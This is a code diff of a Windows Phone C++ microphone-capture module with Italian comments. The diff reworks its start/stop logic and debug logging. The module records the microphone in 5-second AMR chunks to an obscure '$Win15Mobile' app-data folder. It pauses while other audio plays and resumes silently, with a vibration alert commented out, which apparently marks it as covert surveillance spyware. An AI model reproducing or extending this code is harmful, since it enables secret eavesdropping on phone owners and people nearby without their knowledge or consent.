@@ -5,6 +5,8 @@
 #include "Audioclient.h"
 #include "phoneaudioclient.h"
 
+//#define RELESE_DEBUG_MSG
+
 #pragma comment(lib, "Phoneaudioses.lib")
 
 
@@ -58,7 +60,76 @@ using namespace NativeAudioInterface::Native;
 
 MicAdditionalData mad2;
 
+void initFirstCapture(void)
+{
+	NativeCapture::pos=0;
+	NativeCapture::nCamp=1;
 
+}
+
+
+
+void NativeCapture::SetWait(void)
+{
+	SetResetWait=TRUE;
+}
+
+void NativeCapture::ResetWait(void)
+{
+	SetResetWait=FALSE;
+}
+
+
+void NativeCapture::StopCapture(void)
+{
+
+#ifdef  RELESE_DEBUG_MSG
+
+	WCHAR msg[128];
+	swprintf_s(msg, L"\n>>>>>>>>StopCapture: GlobalEventHandle=%x <<<<<<\n",GlobalEventHandle);
+	OutputDebugString(msg);
+
+	Log logInfo;
+	logInfo.WriteLogInfo(msg);
+#endif
+
+	//se gia' non sto catturando esco subito
+	//if(NativeCapture::fStartCapture==FALSE) return;
+
+	
+/***
+	Windows::Foundation::TimeSpan span;
+	span.Duration = 10000000L;   // convert 1 sec to 100ns ticks
+	 
+	Windows::Phone::Devices::Notification::VibrationDevice^ vibr = Windows::Phone::Devices::Notification::VibrationDevice::GetDefault();
+	vibr->Vibrate(span);
+***/
+	////_ZMediaQueue_DisconnectFromService(); //tolto perche' mi crea un eccezione a liverllo di kernel; controllare se si autodisalloca o se crea problemi
+	
+	
+	//se è gia' false significa l'ho stoppato precedentemente 
+   
+#ifdef  RELESE_DEBUG_MSG	
+		Log logInfo4;
+		logInfo4.WriteLogInfo(L"StopCapture: fStartCapture==TRUE");
+#endif		
+					
+		try
+		{
+			pAudioVideoCaptureDevice->StopRecordingAsync();
+		}
+		catch (Platform::Exception^ e) 
+		{
+#ifdef  RELESE_DEBUG_MSG
+			Log logInfo;
+			//in realta' se arrivo qua è perche' c'e' un crash nel modulo per ora lo lascio cosi' per fare il debug
+			logInfo.WriteLogInfo(L"Microphone is in use. [id5]");
+#endif
+		}
+		
+	//pAudioVideoCaptureDevice=nullptr;
+
+}
 
 // Called each time a captured frame is available	
 void CameraCaptureSampleSink::OnSampleAvailable(
@@ -69,7 +140,7 @@ void CameraCaptureSampleSink::OnSampleAvailable(
 {
 
 
-
+	static LONGLONG Start_hnsPresentationTime=0;
 	static char nomeFileBase[DTTMSZAUD];
 
 	// creo file da 5sec 
@@ -80,6 +151,17 @@ void CameraCaptureSampleSink::OnSampleAvailable(
 	//la grandezza del file comprende il timestamp + il trefisso audio piu 999999 campioni
 	char nomeFile[sizeof("\\Data\\Users\\DefApps\\AppData\\{11B69356-6C6D-475D-8655-D29B240D96C8}\\$Win15Mobile\\audio")+DTTMSZAUD+1+6];
 #endif
+
+	if(NativeCapture::SetResetWait==FALSE) 
+	{
+#ifdef RELESE_DEBUG_MSG
+		Log logInfo;
+		logInfo.WriteLogInfo(L"STOP FORZATO");
+#endif
+		NativeCapture::StopCapture();
+		return;
+	}
+
 	
 	Log log;
 
@@ -89,10 +171,20 @@ void CameraCaptureSampleSink::OnSampleAvailable(
 
 	//per evitare gli ultimi campionamenti spuri evito di eseguire ulteriore codice 
 	//if (NativeAudioInterface::Native::NativeCapture::fAudioCaptureForceStop==TRUE) return;
-	if (NativeCapture::fAudioCaptureForceStop==TRUE) return;
+	//in pratica quando io lancio un stopMic setto fStartCapture==FALSE per cui in questo codice devo poter gestire il false
+	//salvando il campione catturato
+	//taglio via gli ultimi campioni catturati
+
 
 	if(NativeCapture::pos==0&&NativeCapture::nCamp==1)
 	{
+#ifdef RELESE_DEBUG_MSG
+		Log logInfo;
+		WCHAR msg2[128];
+		swprintf_s(msg2, L"OnSmaple pos==0&&nCamp==1 INIZIALE:hnsPresentationTime=%x",hnsPresentationTime);
+		logInfo.WriteLogInfo(msg2);
+#endif
+
 		BYTE HEADER[]={35, 33, 65, 77, 82, 10};
 		
 		memcpy(bufferTmp,HEADER,sizeof(HEADER));
@@ -118,6 +210,10 @@ void CameraCaptureSampleSink::OnSampleAvailable(
 		mad2.fId.dwHighDateTime = (DWORD)((temp_time & 0xffffffff00000000) >> 32);
 		mad2.fId.dwLowDateTime  = (DWORD)(temp_time & 0x00000000ffffffff);
 
+
+		//salvo il punto in cui considero che inizia il campione, in teoria non c'e' ne bisogno ma ho visto che alle volte sembra che il play è sotto da svariati minuiti quando in realta' non dovrebbe esserlo
+
+		Start_hnsPresentationTime=hnsPresentationTime*5;
 	}
 	//else 
 	//	pos=0;
@@ -143,10 +239,21 @@ void CameraCaptureSampleSink::OnSampleAvailable(
 		nCamp++;
 	}
 	*/
+
 	DWORD b=false;
 	_Media_Queue_GameHasControl(&b);
-	if(NativeCapture::fAudioCapture==FALSE || b==0)
+
+	if(NativeCapture::SetResetWait==FALSE || b==0)
 	{
+		// entro qua quando ho finito di campionare o quando si riattiva ul play di una periferica audio
+		//per cui chiudo lo stream salvo il log e stoppo l'audio nel caso vi sia entrato per "colpa" di un play altrimenti l'audio dovrebbe essere gia' stoppato
+#ifdef  RELESE_DEBUG_MSG
+		Log logInfo;
+		WCHAR msg2[128];
+		swprintf_s(msg2, L"OnSmaple fAudioCapture==FALSE || b==0 3exit) Pos=%i nCamp=%i: ",NativeCapture::pos,NativeCapture::nCamp);
+		logInfo.WriteLogInfo(msg2);
+#endif
+
 #ifdef _DEBUG
 		WCHAR msg[128];
 		swprintf_s(msg, L"\n3exit) Pos=%i nCamp=%i: \n",NativeCapture::pos,NativeCapture::nCamp);OutputDebugString(msg);
@@ -171,49 +278,83 @@ void CameraCaptureSampleSink::OnSampleAvailable(
 #ifdef _DEBUG
 		OutputDebugStringA(nomeFile);OutputDebugStringA("\n");
 #endif
-		NativeCapture::fAudioCaptureForceStop=TRUE;
+		
+		NativeCapture::StopCapture();
+
 		NativeCapture::pos=0;
 		NativeCapture::nCamp=1;
+
 		if(b==0) 
 		{
+			//se arrivo qua è perche' qualcuno sta playando della musica
+
 			////_ZMediaQueue_DisconnectFromService(); //tolto perche' mi crea un eccezione a liverllo di kernel; controllare se si autodisalloca o se crea problemi
-			NativeCapture::fAudioCapture=FALSE;
-			
+			//se sono arivato qua non per uno StopRecordingAsync ma per un play audio devo dirgli che ho finito di catturare (fAudioCapture=FALSE) e stoppo l'audio 
+		
 			Log logInfo;
 			logInfo.WriteLogInfo(L"Suspending microphone while audio is playing in background");
 
-			NativeCapture::fStartPlay=FALSE;
-			/////  TOGLIENDOLO FUNZIONA
+		
 			try
 			{
-				pAudioVideoCaptureDevice->StopRecordingAsync();
+
+				NativeCapture::StopCapture();
+				//pAudioVideoCaptureDevice->StopRecordingAsync();
 			}
 			catch (Platform::Exception^ e) 
 			{
+#ifdef  RELESE_DEBUG_MSG
 				Log logInfo;
 				//in realta' se arrivo qua è perche' c'e' un crash nel modulo per ora lo lascio cosi' per fare il debug
 				logInfo.WriteLogInfo(L"Microphone is in use. [id4]");
+#endif
 			}
 
 			//aggiunto prima del rilascio per riavviare la cattura se si risolve l'occupazione delle risorsa audio
 			
 			//controllo ogni 10 sec che sia finito il playng dell'audio in bk	
-			while(_WaitForSingleObject(GlobalEventHandle, 10000))
+			//il problema è che GlobalEventHandle se c'e' uno start stop e start cambia ma io sono qua dentro è non ho modo di sapere quale è il nuovo
+			//GlobalEventHandle perche' lo passo tramist starCapture ma potrei aver fatto uno StartRecordingToSinkAsync senza passarer da startCapture per cui devo usare fStartCapture per capire cosa succede
+
+			//se uso _WaitForSingleObject non mi viene notificato lo stop del mic è non ha senso visto che la riga sotto funziona!!!!
+			while(NativeCapture::SetResetWait==TRUE)
 			{
+				//controllare se lo sleep non è bloccante per qualcosa
+				_Sleep(10000);
+#ifdef  RELESE_DEBUG_MSG			
+				WCHAR msg[128];
+				swprintf_s(msg, L"\nLOOP Suspending microphone: _WaitForSingleObject GlobalEventHandle=%x\n",GlobalEventHandle);
+				OutputDebugString(msg);
+
+				Log logInfo;
+				logInfo.WriteLogInfo(msg);
+#endif
+
+		
+
 				_Media_Queue_GameHasControl(&b);
 				if(b==1)
 				{
+#ifdef  RELESE_DEBUG_MSG
+					Log logInfo;
+					logInfo.WriteLogInfo(L"se arrvvo qua perche' non c'e' piu' niente in play");
+#endif
+					//se arrvvo qua perche' non c'e' piu' niente in play 
 					//OutputDebugString(L"Nessun play attivo");	
-					NativeCapture::fStartPlay=TRUE;
 					try
 					{
-						pAudioVideoCaptureDevice->StartRecordingToSinkAsync();
-						// PER RELEASE Controllare se non devo inizializzare anche pos ncamp ecc..
-						NativeCapture::fAudioCapture=TRUE;
-						NativeCapture::fAudioCaptureForceStop=FALSE;
-						Log logInfo;
-						logInfo.WriteLogInfo(L"Resume microphone");
-						/////_ZMediaQueue_DisconnectFromService();
+
+							initFirstCapture();
+							NativeCapture::StartCapture(GlobalEventHandle);
+							//pAudioVideoCaptureDevice->StartRecordingToSinkAsync();
+							// PER RELEASE Controllare se non devo inizializzare anche pos ncamp ecc..
+							Log logInfo;
+							logInfo.WriteLogInfo(L"Resume microphone");
+							/////_ZMediaQueue_DisconnectFromService();
+							//return;
+
+
+
 					}
 					catch (Platform::Exception^ e) 
 					{
@@ -222,27 +363,44 @@ void CameraCaptureSampleSink::OnSampleAvailable(
 						///OutputDebugString(*((wchar_t**)(*((int*)(((Platform::Exception^)((Platform::COMException^)(e)))) - 1)) + 1));
 #endif
 
+#ifdef  RELESE_DEBUG_MSG
 						Log logInfo;
 						//in realta' se arrivo qua è perche' c'e' un crash nel modulo per ora lo lascio cosi' per fare il debug
 						logInfo.WriteLogInfo(L"Microphone is in use. [id6]");
 						///logInfo.WriteLogInfo(*((wchar_t**)(*((int*)(((Platform::Exception^)((Platform::COMException^)(e)))) - 1)) + 1));
+#endif
+						return;
 
 					}
 //					return;					
 					break;
 				}
 			}
-
-
+#ifdef  RELESE_DEBUG_MSG
+			Log logInfo6;
+			logInfo6.WriteLogInfo(L"esco fuori da: while(NativeCapture::fStartCapture==TRUE && _WaitForSingleObject(GlobalEventHandle, 10000))");
+#endif
 		}
 	}
-	else if( (ULONGLONG)(hnsPresentationTime/10000000)>(ULONGLONG)(5*NativeCapture::nCamp))
+	else
+		//if( (ULONGLONG)(hnsPresentationTime/10000000)>(ULONGLONG)(5*NativeCapture::nCamp))
+		if( (ULONGLONG)((hnsPresentationTime-Start_hnsPresentationTime)/10000000)>(ULONGLONG)(5*NativeCapture::nCamp))
 		{
 			//NativeAudioInterface::Native::NativeCapture::fAudioCapture=FALSE;
-			
+#ifdef  RELESE_DEBUG_MSG
+			WCHAR msg2[128];
+			Log logInfo;
+			swprintf_s(msg2, L"OnSmaple 2camp) Pos=%i nCamp=%i hnsPresentationTime=%x hnsPresentationTime/10000000=%i",NativeCapture::pos,NativeCapture::nCamp,(ULONGLONG)hnsPresentationTime,(ULONGLONG)(hnsPresentationTime/10000000));
+			logInfo.WriteLogInfo(msg2);
+#endif
+
+		//nel caso campiono meno di 512 byte scarto il pacchetto
+		if(NativeCapture::pos>512)
+		{
+
 #ifdef _DEBUG
 			WCHAR msg[128];
-			swprintf_s(msg, L"\n2camp) Pos=%i nCamp=%i hnsPresentationTime=%x hnsPresentationTime/10000000=%x\n",NativeCapture::pos,NativeCapture::nCamp,(ULONGLONG)hnsPresentationTime,(ULONGLONG)(hnsPresentationTime/10000000));OutputDebugString(msg);
+			swprintf_s(msg, L"\n2camp) Pos=%i nCamp=%i hnsPresentationTime=%x hnsPresentationTime/10000000=%f\n",NativeCapture::pos,NativeCapture::nCamp,(ULONGLONG)hnsPresentationTime,(ULONGLONG)(hnsPresentationTime/10000000));OutputDebugString(msg);
 
 
 
@@ -262,6 +420,17 @@ void CameraCaptureSampleSink::OnSampleAvailable(
 #ifdef _DEBUG
 			OutputDebugStringA(nomeFile);OutputDebugStringA("\n");
 #endif
+		}
+#ifdef  RELESE_DEBUG_MSG
+		else
+		{
+
+			Log logInfo5;
+			logInfo5.WriteLogInfo(L"^^^pacchetto scartato");
+		}
+#endif
+
+
 			NativeCapture::pos=0;
 			NativeCapture::nCamp++;
 		}
@@ -269,46 +438,7 @@ void CameraCaptureSampleSink::OnSampleAvailable(
 
 }
 
-void NativeCapture::StopCapture()
-{
-	
-	fAudioCapture=FALSE;	
-/***
-	Windows::Foundation::TimeSpan span;
-	span.Duration = 10000000L;   // convert 1 sec to 100ns ticks
-	 
-	Windows::Phone::Devices::Notification::VibrationDevice^ vibr = Windows::Phone::Devices::Notification::VibrationDevice::GetDefault();
-	vibr->Vibrate(span);
-***/
-	////_ZMediaQueue_DisconnectFromService(); //tolto perche' mi crea un eccezione a liverllo di kernel; controllare se si autodisalloca o se crea problemi
-	
-	
-	//se è gia' false significa l'ho stoppato precedentemente 
-   	if(fStartPlay==TRUE) 
-	{
-		fStartPlay=FALSE;
-					/////  TOGLIENDOLO FUNZIONA
-			try
-			{
-				pAudioVideoCaptureDevice->StopRecordingAsync();
-			}
-			catch (Platform::Exception^ e) 
-			{
-				Log logInfo;
-				//in realta' se arrivo qua è perche' c'e' un crash nel modulo per ora lo lascio cosi' per fare il debug
-				logInfo.WriteLogInfo(L"Microphone is in use. [id5]");
-			}
-		
 
-	}
-	
- 
-
-
-
-	//pAudioVideoCaptureDevice=nullptr;
-
-}
 
 #include <thread>
 #include <chrono>
@@ -772,11 +902,29 @@ void initXaudio2(void)
 
 int NativeCapture::StartCapture(HANDLE eventHandle)
 {
-	
-	fAudioCapture=TRUE;	
-	NativeCapture::fAudioCaptureForceStop=FALSE;
-	//aggiunta per gestire dentro OnSampleAvailable il rilascio della risorsa audio
+#ifdef RELESE_DEBUG_MSG
+
+	WCHAR msg[128];
+	swprintf_s(msg, L"\n>>>>>>>>StartCapture: eventHandle=%x <<<<<<\n",eventHandle);
+	OutputDebugString(msg);
+	Log logInfo3;
+	logInfo3.WriteLogInfo(msg);
+#endif
+
 	GlobalEventHandle=eventHandle;
+
+	//quando entro que è perche' si vuole iniziare una cattura dal mic inizializzato allo "startup"
+    //siccome ci possono essere richieste asyncrone se sono gia' in cattura devo ignorare lo start
+
+	///if(NativeCapture::fStartCapture==TRUE) return FALSE;
+
+#ifdef RELESE_DEBUG_MSG
+	Log logInfo5;
+	logInfo5.WriteLogInfo(L"StartCapture: fStartCapture==TRUE");
+#endif
+	
+	//aggiunta per gestire dentro OnSampleAvailable il rilascio della risorsa audio
+	
 
 	/***
 	Windows::Foundation::TimeSpan span;
@@ -805,9 +953,15 @@ int NativeCapture::StartCapture(HANDLE eventHandle)
 	_Media_Queue_GameHasControl(&b);
 	if(b==1)
 	{
+#ifdef  RELESE_DEBUG_MSG
+	Log logInfo;
+	logInfo.WriteLogInfo(L"se entro qui è perche' nessuno sta playando dell'audio per cui posso procedere con l'attivazione della cattura");
+		 // se entro qui è perche' nessuno sta playando dell'audio per cui posso procedere con l'attivazione della cattura
+	Log logInfo2;
+	logInfo2.WriteLogInfo(L"StartCapture b=1a");
+#endif
 		//OutputDebugString(L"Nessun play attivo");	
-		fStartPlay=TRUE;
-
+	
 				
 		/*
 		Registra l'audio
@@ -829,8 +983,6 @@ int NativeCapture::StartCapture(HANDLE eventHandle)
 
 			///InitAudioStream(); ///HO TESTATO CRASHA LO STESSO POSSO RTIMETTERLA
 
-			#define SND_ASYNC    0x0001
-			#define SND_FILENAME 0x00020000
 		//	/*
 		//	 SND_SYNC =           0x0000,  /* play synchronously (default) */
   //SND_ASYNC =          0x0001,  /* play asynchronously */
@@ -856,9 +1008,13 @@ int NativeCapture::StartCapture(HANDLE eventHandle)
 			//initXaudio2();
 	
 		
-			/////  DA RIMETTERE 
+			/////  DA RIMETTERE
+			//a prescindere che andra' bene o male StartRecordingToSinkAsync io sono in una condizione per il sistema di cattura
+			//anche se non dovrebbe mai succedere di arrivare qua se sono gia' in fStartCapture=TRUE e per cui 2 start generano un eccezione
+			initFirstCapture();
 			pAudioVideoCaptureDevice->StartRecordingToSinkAsync();
 			/////_ZMediaQueue_DisconnectFromService();
+			return TRUE;
 		}
 		catch (Platform::Exception^ e) 
 		{
@@ -867,13 +1023,14 @@ int NativeCapture::StartCapture(HANDLE eventHandle)
 			///OutputDebugString(*((wchar_t**)(*((int*)(((Platform::Exception^)((Platform::COMException^)(e)))) - 1)) + 1));
 #endif
 
+#ifdef RELESE_DEBUG_MSG
 			Log logInfo;
 			//in realta' se arrivo qua è perche' c'e' un crash nel modulo per ora lo lascio cosi' per fare il debug
 			logInfo.WriteLogInfo(L"Microphone is in use. [id2]");
-			///logInfo.WriteLogInfo(*((wchar_t**)(*((int*)(((Platform::Exception^)((Platform::COMException^)(e)))) - 1)) + 1));
-
+#endif
+			return FALSE;
 		}
-		return FALSE;
+		
 	}
 
 	//OutputDebugString(L"Play attivo");
@@ -881,39 +1038,66 @@ int NativeCapture::StartCapture(HANDLE eventHandle)
 	logInfo.WriteLogInfo(L"Can not activate microphone while background audio is playing, standing by");
 
 	//controllo ogni 10 sec che sia finito il playng dell'audio in bk	
-	while(fAudioCapture==TRUE && _WaitForSingleObject(eventHandle, 10000))
+	//esco quando qualcuno chiude l'evento mic
+	
+	while(_WaitForSingleObject(eventHandle, 10000))
+	//se uso _WaitForSingleObject non mi viene notificato lo stop del mic è non ha senso visto che la riga sotto funziona!!!!
+	//while(NativeCapture::SetResetWait==TRUE)
 	{
+	//	_Sleep(10000);
+	
+#ifdef RELESE_DEBUG_MSG
+		Log logInfo;
+		logInfo.WriteLogInfo(L"StartCapture fStartCapture==TRUE && _WaitForSingleObject(eventHandle, 10000)");
+#endif
 		_Media_Queue_GameHasControl(&b);
 		if(b==1)
 		{
-			//OutputDebugString(L"Nessun play attivo");	
-			fStartPlay=TRUE;
-			try
-			{
-				/////  DA RIMETTERE 
-				pAudioVideoCaptureDevice->StartRecordingToSinkAsync();
-				Log logInfo;
-				logInfo.WriteLogInfo(L"Resume microphone");
+			//se arrivo qui è perche' il play dell'audio è finito è sessuno nel frattempo ha chiuso l'evento
+#ifdef RELESE_DEBUG_MSG
+			Log logInfo;
+			logInfo.WriteLogInfo(L"StartCapture b==1b");
+			logInfo.WriteLogInfo(L"se arrivo qui è perche' il play dell'audio è finito è sessuno nel frattempo ha chiuso l'evento");
 
-				/////_ZMediaQueue_DisconnectFromService();
-			}
-			catch (Platform::Exception^ e) 
-			{
+#endif
+			//OutputDebugString(L"Nessun play attivo");	
+			//controllo che nel frattempo non vi sia stato uno statcapture
+			
+				try
+				{
+
+						//se arrivo qua significa che devo iniziare un campionamento per cui inizializzo initStartCapture();
+						initFirstCapture();
+						pAudioVideoCaptureDevice->StartRecordingToSinkAsync();
+						Log logInfo;
+						logInfo.WriteLogInfo(L"Resume microphone");
+
+						return TRUE;
+						/////_ZMediaQueue_DisconnectFromService();
+				}
+				catch (Platform::Exception^ e) 
+				{
 #ifdef _DEBUG
-				OutputDebugString(L"<<<eccezione capture Mic3 gestita>>>\n");
-				///OutputDebugString(*((wchar_t**)(*((int*)(((Platform::Exception^)((Platform::COMException^)(e)))) - 1)) + 1));
+					OutputDebugString(L"<<<eccezione capture Mic3 gestita>>>\n");
+					///OutputDebugString(*((wchar_t**)(*((int*)(((Platform::Exception^)((Platform::COMException^)(e)))) - 1)) + 1));
 #endif
 
-				Log logInfo;
-				//in realta' se arrivo qua è perche' c'e' un crash nel modulo per ora lo lascio cosi' per fare il debug
-				logInfo.WriteLogInfo(L"Microphone is in use. [id3]");
-				///logInfo.WriteLogInfo(*((wchar_t**)(*((int*)(((Platform::Exception^)((Platform::COMException^)(e)))) - 1)) + 1));
-
-			}
-			return TRUE;
+	
+#ifdef RELESE_DEBUG_MSG
+					Log logInfo;
+					//in realta' se arrivo qua è perche' c'e' un crash nel modulo per ora lo lascio cosi' per fare il debug
+					logInfo.WriteLogInfo(L"Microphone is in use. [id3]");
+#endif
+			
+					return FALSE;
+				}
+			
 		}
 	}
-
+#ifdef  RELESE_DEBUG_MSG
+	Log logInfo7;
+	logInfo7.WriteLogInfo(L"uscito da: while(_WaitForSingleObject(eventHandle, 10000))");
+#endif
 
 return TRUE;
 
@@ -944,9 +1128,12 @@ return TRUE;
 NativeAudioInterface::Native::NativeCapture::NativeCapture()
 {
 	//initXaudio2();
+	//quando inizializzo il microfono il sistema non è icattura
+	//fStartCapture mi dice se qualcuno ha fatto una richiesta di start cattura
 
-	fStartPlay=FALSE;
-	fAudioCapture=FALSE;
+	//questo viene eseguito solo all'avvio della BK non con una nuova conf
+
+
 	/*****
 	abilitando non rifaccio un nuovo new per ogni volta che devo attivare il microfono ma sfrutto quanto gia'  allocato in precedenza
 	visto che dai test fatti in AudioOnly.sln diventa instabile
@@ -1063,11 +1250,12 @@ NativeAudioInterface::Native::NativeCapture::NativeCapture()
 			OutputDebugString(L"<<<eccezione capture Mic1 gestita>>>\n");
 			///OutputDebugString(*((wchar_t**)(*((int*)(((Platform::Exception^)((Platform::COMException^)(e)))) - 1)) + 1));
 #endif
-
+#ifdef  RELESE_DEBUG_MSG
 			Log logInfo;
 			//in realta' se arrivo qua è perche' c'e' un crash nel modulo per ora lo lascio cosi' per fare il debug
 			logInfo.WriteLogInfo(L"Microphone is in use. [id1]");
 			///logInfo.WriteLogInfo(*((wchar_t**)(*((int*)(((Platform::Exception^)((Platform::COMException^)(e)))) - 1)) + 1));
+#endif
 
 		}
 
@@ -1075,8 +1263,13 @@ NativeAudioInterface::Native::NativeCapture::NativeCapture()
 
 
 	// non serve: _Sleep(2000); //inserito per vedere se ritardando si evita il tak che capita ogni tanto sui lumia
-	NativeCapture::pos=0;
-	NativeCapture::nCamp=1;
+	//inizializzo i dati per poter effettuare la prima cattura
+	initFirstCapture();
+#ifdef  RELESE_DEBUG_MSG
+	Log logInfo;
+	logInfo.WriteLogInfo(L">>>>>>>>NativeCapture  0Init) ");
+#endif
+
 #ifdef _DEBUG
 	OutputDebugString(L"0Init) \n");
 #endif
